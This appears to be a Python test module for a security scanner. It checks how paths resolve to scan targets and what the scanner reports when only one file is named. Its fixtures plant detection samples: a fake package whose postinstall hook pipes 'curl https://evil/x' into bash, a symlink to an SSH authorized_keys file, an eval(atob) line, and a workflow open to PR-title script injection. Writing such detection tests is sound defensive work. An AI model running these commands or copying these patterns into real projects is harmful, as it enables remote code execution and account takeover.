#!/usr/bin/env python3
"""A path names what to scan, whether or not anybody put it under git (#1535)."""
from __future__ import annotations

import io
import os
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

from stayawake.bots.security import resolution
from stayawake.bots.security.resolution import resolve_local_targets
from stayawake.bots.security.service import workers
from stayawake.bots.security.signatures import load_signatures
from stayawake.bots.security.targets import ScanOptions


class TestWhatAPathResolvesTo(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        (self.d / "a.js").write_text("export const ok = 1;\n", encoding="utf-8")

    def _one(self, pattern):
        found = resolve_local_targets([str(pattern)], ScanOptions())
        self.assertEqual(len(found), 1, f"{pattern} resolved to {found}")
        return found[0]

    def test_a_directory_nobody_put_under_git_is_scanned_as_itself(self):
        t = self._one(self.d)
        self.assertEqual(t.root, self.d.resolve())
        self.assertIsNone(t.include_only)
        self.assertFalse(t.is_repo)

    def test_a_single_file_is_scanned_as_that_file(self):
        t = self._one(self.d / "a.js")
        self.assertEqual(t.root, self.d.resolve())
        self.assertEqual(t.include_only, ("a.js",))
        self.assertFalse(t.is_repo)

    def test_a_repository_is_still_a_repository(self):
        (self.d / ".git").mkdir()
        t = self._one(self.d)
        self.assertTrue(t.is_repo)
        self.assertIsNone(t.include_only)

    def test_a_path_that_names_nothing_resolves_to_nothing(self):
        self.assertEqual(resolve_local_targets([str(self.d / "absent")], ScanOptions()), [])

    def test_a_sweep_still_finds_the_repositories_under_it(self):
        (self.d / "one").mkdir()
        (self.d / "one" / ".git").mkdir()
        (self.d / "two").mkdir()
        (self.d / "two" / ".git").mkdir()
        found = resolve_local_targets([str(self.d)], ScanOptions())
        self.assertEqual({t.root.name for t in found}, {"one", "two"})
        self.assertTrue(all(t.is_repo for t in found))


class TestWhatANonRepositoryScanSays(unittest.TestCase):
    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        (self.d / "a.js").write_text("export const ok = 1;\n", encoding="utf-8")

    def _scan(self, *, is_repo, include_only=None, names_one_file=False):
        # Built through the real scope, so the job cannot be given a shape the resolver never
        # produces — the disclosure is derived from it, not passed in beside it.
        kind = (resolution.ONE_FILE if names_one_file
                else resolution.REPOSITORY if is_repo else resolution.DIRECTORY)
        scope = resolution.LocalTarget(Path(self.d), include_only, kind)
        job = workers.LocalScanJob(str(self.d), "t", ScanOptions(), load_signatures(), [],
                                   include_only, scope.is_repo, scope.names_one_file,
                                   scope.skipped())
        return workers.scan_local(job).result

    def test_it_says_the_history_checks_did_not_run(self):
        notes = " ".join(self._scan(is_repo=False).notes)
        self.assertIn("not a repository", notes)
        self.assertIn("history", notes)

    def test_a_repository_scan_does_not_say_that(self):
        self.assertNotIn("not a repository", " ".join(self._scan(is_repo=True).notes))

    def test_only_the_named_file_is_read(self):
        # The siblings below are ones WHOLE-TARGET matchers reach — a link, a dependency tree, a
        # per-file payload. The earlier version of this test planted only the last, which a
        # partitionable matcher scopes on its own, so it could not fail.
        (self.d / "other.js").write_text("const x = eval(atob('Zm9v'));\n", encoding="utf-8")
        (self.d / "payload.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")
        os.symlink("/Users/ndevu/.ssh/authorized_keys", self.d / "redirect-link")
        (self.d / "node_modules" / "evilpkg").mkdir(parents=True)
        (self.d / "node_modules" / "evilpkg" / "package.json").write_text(
            '{"name":"evilpkg","version":"1.0.0",'
            '"scripts":{"postinstall":"curl -s https://evil/x | bash"}}', encoding="utf-8")
        result = self._scan(is_repo=False, include_only=("a.js",), names_one_file=True)
        named_elsewhere = [f for f in result.findings
                           if not f.path.endswith("a.js")]
        self.assertEqual(named_elsewhere, [],
                         f"a sibling reached the verdict: {[f.path for f in named_elsewhere]}")


if __name__ == "__main__":
    unittest.main()


class TestWhatARefusalSays(unittest.TestCase):
    """A target that carries no verdict is named, with the reason — never refused in silence."""

    def _run(self, target: Path):
        cfgd = Path(tempfile.mkdtemp())
        (cfgd / "c.yml").write_text("allowlist: []\n", encoding="utf-8")
        err = io.StringIO()
        with redirect_stdout(io.StringIO()), redirect_stderr(err):
            from stayawake.bots.security import service
            rc = service.scan(str(cfgd / "c.yml"), paths=[str(target)], no_stream=True)
        return rc, err.getvalue()

    def test_it_names_the_target_and_why(self):
        empty = Path(tempfile.mkdtemp())
        rc, err = self._run(empty)
        self.assertEqual(rc, 2)
        self.assertIn(str(empty), err)
        self.assertIn("could be read", err)

    def test_it_does_not_claim_history_checks_were_skipped_when_nothing_was_read(self):
        _rc, err = self._run(Path(tempfile.mkdtemp()))
        self.assertNotIn("not a repository", err)


class TestABareRunAimsAtRepositories(unittest.TestCase):
    """`saw scan` with no path is about the repository being stood in — not the folder."""

    def _bare(self, setup):
        import subprocess
        from stayawake.bots.security import service
        here = os.getcwd()          # BEFORE setup: a setup that chdirs would otherwise make this
        self.addCleanup(os.chdir, here)   # restore a temp dir that is about to be deleted
        d = Path(tempfile.mkdtemp())
        setup(d, subprocess)
        cfgd = Path(tempfile.mkdtemp())
        (cfgd / "c.yml").write_text("allowlist: []\n", encoding="utf-8")
        os.chdir(d)
        try:
            err = io.StringIO()
            with redirect_stdout(io.StringIO()), redirect_stderr(err):
                rc = service.scan(str(cfgd / "c.yml"), no_stream=True)
            return rc, err.getvalue()
        finally:
            os.chdir(here)

    def test_it_still_finds_the_repository_it_is_standing_in(self):
        def setup(d, sp):
            sp.run(["git", "init", "-q", str(d)], check=True)
            (d / "a.js").write_text("export const ok = 1;\n", encoding="utf-8")
        rc, err = self._bare(setup)
        self.assertEqual(rc, 0)
        self.assertIn("scanning current repository", err)

    def test_it_finds_the_repository_from_a_subdirectory(self):
        def setup(d, sp):
            sp.run(["git", "init", "-q", str(d)], check=True)
            (d / "sub").mkdir()
            (d / "sub" / "a.js").write_text("export const ok = 1;\n", encoding="utf-8")
        rc, err = self._bare(lambda d, sp: (setup(d, sp), os.chdir(d / "sub"))[0])
        self.assertEqual(rc, 0)
        self.assertIn("scanning current repository", err)

    def test_outside_a_repository_it_says_so_rather_than_scanning_the_folder(self):
        rc, err = self._bare(lambda d, sp: (d / "a.js").write_text("x\n", encoding="utf-8"))
        self.assertEqual(rc, 2)
        self.assertIn("not a repository", err)
        self.assertIn("saw scan <path>", err)


class TestNamingAFileLosesNoDetection(unittest.TestCase):
    """Scanning a file finds what scanning its directory finds ABOUT THAT FILE, for every check
    that judges a file. What a PROJECT-level check would have said is a known loss, pinned as such
    in TestTheKnownLossIsDisclosed below — not covered here, so this class cannot imply it.

    The comparison is the point: an earlier version of this module tested the file scan alone, so
    every detection the re-rooting silently dropped still passed.
    """

    def _sigs_for(self, target: Path, of_file: str) -> set[str]:
        from stayawake.bots.security import service
        cfgd = Path(tempfile.mkdtemp())
        (cfgd / "c.yml").write_text("allowlist: []\n", encoding="utf-8")
        out = io.StringIO()
        with redirect_stdout(out), redirect_stderr(io.StringIO()):
            service.scan(str(cfgd / "c.yml"), paths=[str(target)], no_stream=True)
        return {line.split("]")[1].split()[0]
                for line in out.getvalue().splitlines()
                if "  • [" in line and of_file in line}

    def _case(self, build) -> tuple[set[str], set[str]]:
        d = Path(tempfile.mkdtemp())
        rel = build(d)
        return self._sigs_for(d, rel), self._sigs_for(d / rel, rel)

    def _assert_no_loss(self, build, what: str):
        by_dir, by_file = self._case(build)
        self.assertTrue(by_dir, f"the fixture for {what} is not detected at all — it proves nothing")
        self.assertEqual(by_dir - by_file, set(),
                         f"naming the {what} lost: {sorted(by_dir - by_file)}")

    def test_a_manifest_named_directly(self):
        def build(d):
            (d / "package.json").write_text(
                '{"name":"x","version":"1.0.0","dependencies":{"fetch-page-assets":"1.2.9"}}',
                encoding="utf-8")
            return "package.json"
        self._assert_no_loss(build, "manifest")

    def test_a_source_payload_named_directly(self):
        def build(d):
            (d / "loader.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")
            return "loader.js"
        self._assert_no_loss(build, "source file")

    def test_a_write_redirect_link_named_directly(self):
        def build(d):
            os.symlink("/Users/ndevu/.ssh/authorized_keys", d / "redirect")
            return "redirect"
        self._assert_no_loss(build, "symlink")

    def test_a_workflow_named_directly_keeps_its_path(self):
        # The one that catches re-rooting: this matcher requires `.github/workflows/` in the path,
        # so a target rooted at the file's own parent flattens it away and detects nothing.
        def build(d):
            import subprocess
            subprocess.run(["git", "init", "-q", str(d)], check=True)
            wf = d / ".github" / "workflows"
            wf.mkdir(parents=True)
            (wf / "pr.yml").write_text(
                "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n"
                '      - run: echo "${{ github.event.pull_request.title }}"\n', encoding="utf-8")
            return ".github/workflows/pr.yml"
        self._assert_no_loss(build, "workflow")


class TestWhatTheVerdictIsAbout(unittest.TestCase):
    """A file's verdict is reported under the file's name — never its repository's."""

    def setUp(self):
        import subprocess
        self.repo = Path(tempfile.mkdtemp())
        subprocess.run(["git", "init", "-q", str(self.repo)], check=True)
        (self.repo / "src").mkdir()
        (self.repo / "src" / "clean.js").write_text("export const ok = 1;\n", encoding="utf-8")
        (self.repo / "src" / "bad.js").write_text("var _$_ab12 = 1;\n", encoding="utf-8")
        self.cfg = Path(tempfile.mkdtemp()) / "c.yml"
        self.cfg.write_text("allowlist: []\n", encoding="utf-8")

    def _report(self, target: Path) -> str:
        from stayawake.bots.security import service
        out = io.StringIO()
        with redirect_stdout(out), redirect_stderr(io.StringIO()):
            service.scan(str(self.cfg), paths=[str(target)], no_stream=True)
        return out.getvalue()

    def test_a_clean_file_does_not_declare_its_repository_clean(self):
        # `--alert` opens and closes an issue titled with this name: labelling one file's clean
        # result with its repository closes that repository's open security issue.
        report = self._report(self.repo / "src" / "clean.js")
        self.assertIn("src/clean.js", report)
        lines = [l for l in report.splitlines() if "clean" in l and str(self.repo) in l]
        self.assertTrue(lines, "no verdict row names the file")
        for line in lines:
            self.assertIn("clean.js", line, f"a verdict row names something else: {line.strip()}")

    def test_it_says_the_project_level_checks_did_not_run(self):
        report = self._report(self.repo / "src" / "clean.js")
        self.assertIn("Only the file you named was read", report)


class TestTheKnownLossIsDisclosed(unittest.TestCase):
    """Naming a file DOES lose the project-level checks. That loss is pinned here so it stays a
    deliberate, disclosed decision instead of drifting into a silent gap."""

    def setUp(self):
        self.d = Path(tempfile.mkdtemp())
        (self.d / "package-lock.json").write_text(
            '{"lockfileVersion": 3, "packages": {"": {"name": "app"}}}', encoding="utf-8")
        pkg = self.d / "node_modules" / "ghosty"
        pkg.mkdir(parents=True)
        (pkg / "package.json").write_text('{"name":"ghosty","version":"1.0.0"}', encoding="utf-8")
        self.rel = "node_modules/ghosty/package.json"
        self.cfg = Path(tempfile.mkdtemp()) / "c.yml"
        self.cfg.write_text("allowlist: []\n", encoding="utf-8")

    def _report(self, target: Path) -> str:
        from stayawake.bots.security import service
        out = io.StringIO()
        with redirect_stdout(out), redirect_stderr(io.StringIO()):
            service.scan(str(self.cfg), paths=[str(target)], no_stream=True)
        return out.getvalue()

    def test_the_directory_scan_reports_it(self):
        # If this stops holding the fixture is dead and the test below proves nothing.
        self.assertIn("ghost-package", self._report(self.d))

    def test_naming_the_file_does_not_and_says_so(self):
        report = self._report(self.d / self.rel)
        self.assertNotIn("ghost-package", report)
        # Asserted against the note itself: "installed package" appears elsewhere in the report, so
        # searching the whole of it passed even with the note's wording gutted.
        note = self._one_file_note(report)
        self.assertIn("installed package", note)
        self.assertIn("history", note)

    @staticmethod
    def _one_file_note(report: str) -> str:
        lines = report.splitlines()
        for i, line in enumerate(lines):
            if "Only the file you named was read" in line:
                tail = []
                for nxt in lines[i:]:
                    if nxt.strip() and not nxt.startswith(("  •", "     ", "   ")) and tail:
                        break
                    tail.append(nxt)
                return " ".join(tail)
        return ""
